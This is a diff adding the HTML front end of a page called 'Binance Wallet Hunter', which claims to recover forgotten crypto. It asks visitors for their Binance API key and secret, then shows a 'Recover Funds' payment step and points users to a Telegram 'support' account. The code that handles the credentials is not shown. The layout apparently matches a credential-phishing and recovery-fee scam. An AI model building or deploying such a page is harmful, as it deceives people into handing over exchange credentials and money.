@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance Wallet Hunter</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>🔍 Binance Wallet Hunter</h1>
+        <p>Find your forgotten crypto in minutes!</p>
+
+        <div class="steps">
+            <div class="step">
+                <h3>1. Connect Wallet</h3>
+                <form id="walletForm">
+                    <input type="text" id="apiKey" placeholder="Binance API Key" required>
+                    <input type="password" id="apiSecret" placeholder="Binance API Secret" required>
+                    <button id="connectBtn">Connect Wallet</button>
+                </form>
+            </div>
+
+            <div class="step" id="scanStep" style="display: none;">
+                <h3>2. Scan Wallet</h3>
+                <div id="result"></div>
+                <button id="scanBtn">Start Scan</button>
+            </div>
+
+            <div class="step" id="paymentStep" style="display: none;">
+                <h3>3. Recover Funds</h3>
+                <div id="payment"></div>
+            </div>
+        </div>
+
+        <div id="guide" class="guide" style="display: none;">
+            <p>⏳ Processing your request... Check Telegram for updates!</p>
+            <p>Haven't received help? <a href="https://t.me/BinanceHunterSupport" target="_blank">Message us directly</a></p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
